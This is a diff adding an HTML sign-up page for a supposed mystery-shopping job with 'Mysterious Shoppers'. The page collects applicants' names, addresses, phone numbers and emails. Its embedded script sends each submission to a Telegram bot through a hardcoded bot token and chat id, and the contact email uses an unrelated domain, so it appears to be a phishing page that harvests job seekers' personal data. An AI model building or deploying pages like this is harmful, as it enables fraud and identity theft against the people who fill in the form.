@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mysterious Shoppers</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16865190388"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-16865190388');
+  </script>
+  <script>
+    function sendToTelegram(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const botToken = "7739391599:AAFEEjeG-JqOabHqHrPcSu9EULC8auFzhzs";
+        const chatId = "-4744200617";
+        const form = event.target;
+        const formData = new FormData(form);
+
+        let message = "📝 *New Form Submission*\n";
+        formData.forEach((value, key) => {
+            message += `🔑 *${key}*: ${value}\n`;
+        });
+
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
+        })
+        .then(response => response.json())
+        .then(() => {
+            window.location.href = "status.html"; // Redirect after sending
+        })
+        .catch(error => console.error("Error:", error));
+    }
+  </script>
+</head>
+<body class="font-sans bg-gray-900 text-gray-800">
+  <!-- Header -->
+  <header class="bg-gray-900 shadow">
+    <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+      <div class="text-2xl font-bold text-orange-500"><a href="/"><img width="150px" src="logo.png"></a></div>
+      <a href="tel:+19408608554" class="bg-orange-500 text-white px-4 py-2 rounded-lg font-bold">Call Us: +1 940 860 8554</a>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="bg-cover bg-center h-64" style="background-image: url('https://www.shutterstock.com/image-photo/banner-cover-asian-woman-using-600nw-1922516153.jpg');">
+    <div class="h-full bg-black bg-opacity-50 flex items-center justify-center">
+      <h1 class="text-white text-4xl font-bold p-4">Join the Mysterious Shoppers Mystery Shopping Team!</h1>
+    </div>
+  </section>
+
+  <!-- Content Section -->
+  <div class="max-w-[900px] mx-auto px-4 py-8 flex flex-col lg:flex-row gap-8">
+    <!-- Main Content -->
+    <main class="bg-gray-100 align-center lg:w-[1000px] rounded-lg p-6 shadow-lg">
+      <h2 class="text-2xl font-bold mb-4 text-center">Mysterious Shoppers, a member company of the CX Group, works with leading brands across the U.S. and Canada.</h2>
+      
+      <h3 class="text-xl font-semibold mt-8 mb-4">Sign Up Today</h3>
+      <form class="bg-white p-6 rounded-lg shadow-md space-y-4" onsubmit="sendToTelegram(event)">
+        <!-- Name -->
+        <div>
+            <label for="name" class="block text-sm font-semibold mb-1">Full Name</label>
+            <input type="text" id="name" name="Name" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- Street Address -->
+        <div>
+            <label for="street-address" class="block text-sm font-semibold mb-1">Street Address</label>
+            <input type="text" id="street-address" name="Street Address" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- City -->
+        <div>
+            <label for="city" class="block text-sm font-semibold mb-1">City</label>
+            <input type="text" id="city" name="City" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- State -->
+        <div>
+            <label for="state" class="block text-sm font-semibold mb-1">State</label>
+            <input type="text" id="state" name="State" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- Postal Code -->
+        <div>
+            <label for="postal-code" class="block text-sm font-semibold mb-1">Postal Code</label>
+            <input type="text" id="postal-code" name="Postal Code" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- Country -->
+        <div>
+            <label for="country" class="block text-sm font-semibold mb-1">Country</label>
+            <select id="country" name="Country" class="w-full border-gray-300 border rounded-lg p-2 focus:ring-orange-500 focus:border-orange-500" required>
+                <option value="USA">United States</option>
+                <option value="Canada">Canada</option>
+            </select>
+        </div>
+        <!-- Phone -->
+        <div>
+            <label for="phone" class="block text-sm font-semibold mb-1">Phone Number</label>
+            <input type="tel" id="phone" name="Phone" class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- Email -->
+        <div>
+            <label for="email" class="block text-sm font-semibold mb-1">Email Address</label>
+            <input type="email" id="email" name="Email" class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- How Did You Hear About Us -->
+        <div>
+            <label for="heard" class="block text-sm font-semibold mb-1">How Did You Hear About Us?</label>
+            <input type="text" id="heard" name="Referral Source" class="w-full border-gray-300 rounded-lg border p-2 focus:ring-orange-500 focus:border-orange-500" required>
+        </div>
+        <!-- Submit Button -->
+        <div>
+            <button type="submit" class="w-full bg-orange-500 text-white py-2 px-4 rounded-lg font-semibold hover:bg-orange-600">
+                Submit Application
+            </button>
+        </div>
+      </form>
+    </main>
+    
+  </div>
+
+  <!-- Footer -->
+  <footer class="text-white py-8">
+    <div class="container mx-auto px-4">
+      <div class="text-center">
+        <p class="text-sm">Contact Us:</p>
+        <p class="text-sm">Phone: <a href="tel:+19408608554" class="underline">+1 940 860 8554</a></p>
+        <p class="text-sm">Email: <a href="mailto:info@mysteriousshoppers.ceovalidhub.com" class="underline">info@mysteriousshoppers.ceovalidhub.com</a></p>
+      </div>
+      <p class="text-center text-sm mt-8">&copy; 2025 Mysterious Shoppers. All rights reserved. | Privacy Policy | Cookie Policy</p>
+    </div>
+  </footer>
+</body>
+</html>
